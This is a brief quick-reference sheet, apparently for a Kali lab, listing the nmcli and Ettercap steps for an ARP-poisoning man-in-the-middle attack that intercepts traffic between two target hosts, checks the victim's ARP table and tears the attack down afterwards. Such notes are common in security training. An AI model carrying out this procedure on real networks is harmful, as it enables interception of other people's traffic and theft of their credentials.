ETTERCAP MITM - QUICK REF

1.  sudo nmcli con mod "<connection>" ipv4.method manual ipv4.addresses <kali-ip>/24
2.  sudo nmcli con up "<connection>"
3.  sudo ettercap -G
4.  Hosts → Scan for hosts
5.  Hosts → Hosts list → set Target 1 + Target 2
6.  MITM → ARP poisoning → Sniff remote connections → OK
7.  Verify on victim: arp -a  (should show Kali's MAC)
8.  [optional] Wireshark filter: ip.addr == <t1> && ip.addr == <t2>
9.  MITM → Stop MITM attack(s)
10. sudo nmcli con mod "<connection>" ipv4.method auto && sudo nmcli con up "<connection>"
